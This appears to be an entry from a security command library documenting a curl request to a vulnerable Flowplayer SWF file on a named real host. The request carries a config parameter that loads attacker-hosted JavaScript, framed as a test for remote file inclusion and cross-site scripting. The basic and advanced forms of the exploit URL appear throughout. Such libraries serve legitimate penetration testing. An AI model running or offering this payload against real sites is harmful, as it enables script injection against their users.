---
id: cmd-uuid-swf-access
data: >-
  curl
  "http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js"
  -v
tags:
  - xss
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:17.683Z'
verified: false
validated: true
submitted: true
---
# access-vulnerable-swf-url

## Command

```bash
curl "http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js" -v
```

## Description

This command uses curl to access the vulnerable SWF endpoint with a malicious config parameter, simulating the exploit to verify RFI and JS loading. The -v flag provides verbose output for debugging the HTTP request and response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full exploit URL with config param | Yes |
| -v | Verbose mode for request details | No |

## Examples

### Basic Usage

```bash
curl "http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js" -v -o response.bin
```

## Expected Output

HTTP response headers and body (SWF binary data); in a browser context, this would trigger Flash load and JS execution with alerts. Look for 200 OK and no errors indicating successful fetch.

## Related

- [[Related Procedure: Exploit-Flash-XSS-via-Config-Parameter]]
